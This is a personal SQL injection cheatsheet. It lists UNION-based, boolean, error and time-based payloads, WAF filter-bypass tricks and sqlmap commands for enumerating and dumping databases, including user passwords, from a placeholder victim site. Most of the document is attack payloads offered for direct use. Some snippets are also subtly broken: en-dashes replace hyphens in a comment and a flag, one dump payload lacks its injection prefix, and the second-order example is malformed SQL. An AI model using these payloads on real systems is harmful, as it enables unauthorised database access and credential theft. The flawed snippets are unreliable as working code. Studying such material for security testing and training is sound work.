# SPIROS (SQL Cheatsheet)

## SQL Cheatsheet:

### Commenting in SQL

![commenting diagram](img/sql_cheatsheet/sql%20comments.jpg)

The figure above summarizes the syntax for commenting in various SQL DB. Do note that for MySQL, `-- -` is required for commenting instead of `--` as a whitespace or control character is required after the second dash.
> When using `#` as a comment for MySQL, there's no need to add a space after.

### Overview for SQLi

|No.|Steps|Method|
|---|---|---|
|1|Identify instances where application access DB| Look at URL param, cookies, POST data, HTTP headers|
|2|Try injecting SQL| Start with single quotes, concatenator characters, eg: `' 'FOO`|
|3|Determine no. of cols| `' UNION SELECT NULL -- -`, `' UNION SELECT NULL,NULL -- -` ... until there's no error|
|4.1|Determine which cols have string data type| `' UNION SELECT 'a', NULL, NULL -- -`, `' UNION SELECT NULL, 'a', NULL -- -`, `' UNION SELECT NULL, NULL, 'a' -- -` ... until there's no error |
|4.2|Determine which cols have numeric data type| `' UNION SELECT 1, NULL, NULL -- -`, `' UNION SELECT NULL, 1, NULL -- -`, `' UNION SELECT NULL, NULL, 1 -- -`... until there's no error|
|4.3|Use conditional responses if there's no direct method of transmitting data|`admin' and ASCII(SUBSTRING(password,1,1))=113 -- -` login succeeds means first char for password is `q`|
|4.4.1|Use conditional errors if there's no noticeable effect on application behavior|`SELECT 1/0 FROM dual WHERE (SELECT username FROM users WHERE username = 'alice') = 'alice'`. dual is default dummy table present in most DB. If query has error, means `alice` is a valid username|
|4.4.2|Conditional errors (time delay)|`' UNION SELECT IF(ASCII(SUBSTRING(@@version,1,1))=49,BENCHMARK(5000000,SHA1('dummy_data')),NULL),NULL,NULL -- -`. If first char of database version is `1` (ASCII: 49), will have delay in server's response.
|5|Extracting table and cols name|`' UNION SELECT table_name, column_name, NULL FROM information_schema.columns -- -`|
|6.1|Dumping DB using multi cols with string data type|`' UNION SELECT first_name, last_name, employee_id FROM dependents –- -`|
|6.2|Dumping DB using 1 col with string data type|`SELECT CONCAT(username,':',password), NULL, NULL from users -- -`|
|6.3|Dumping DB using multi cols with numeric data type|`' UNION SELECT ASCII(SUBSTRING(password,1,1)),NULL,NULL FROM users WHERE username='admin' -- -` (returns 113, i.e., 'q')|
|6.4|Dumping DB using conditional responses|`admin' and ASCII(SUBSTRING(password,1,1))=113 -- -` (login succeeds) ASCII 113 corresponds to letter 'q'|

### Bypassing filters

|Types of blacklisting filter|Ways to bypass|
|---|---|
|Strings|Use CHAR() function to construct strings. eg: `CHAR(109)+CHAR(97)` is equals to `'ma'`|
|Comments|Use `' OR 'a'='a` instead of `' OR 1=1 -- -`|
|Keywords|Try mix of different cases, adding null byte in front, manipulating string, converting string to URL encoded form. Eg: `SELECT` is banned but can try `SeLeCt`, `%00SELECT`, `SELSELECTECT`, `%53%45%4c%45%43%54`

### SQLmap

|Types of attack|Methods|
|---|---|
|POST request|`sqlmap -u <URL> --cookie='PHPSESSID=op2….' --data='user=a&pass=a' -p user --technique=B --dbs`|
|GET request|`sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U --dbs`|
|Using Request file from Burpsuite|`sqlmap -r <path to .req file> -p user –dbs`|

```
--dbs: show the databases connected to the application
-D database_name --tables: show all tables in db
-T table_name --columns: show all columns of the db
-C column1,column2  --dump: dump all the contents of the columns
```
### Second Order SQLi

When data is first inserted into the DB, it is properly sanitised. Afterwards, it may be processed in unsafe ways.

Eg: When a user search for the term `O'Reilly`, the query term was `SELECT author,title,year FROM books WHERE publisher='O''Reilly'`. Notice how the quotation mark after `O` was escaped. However, when the `publisher` was being called in a later query, it might have the search string `SELECT * FROM publisher='O'Reilly'`. This causes second-order SQLi.

### Good resources

[Burpsuite SQL Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)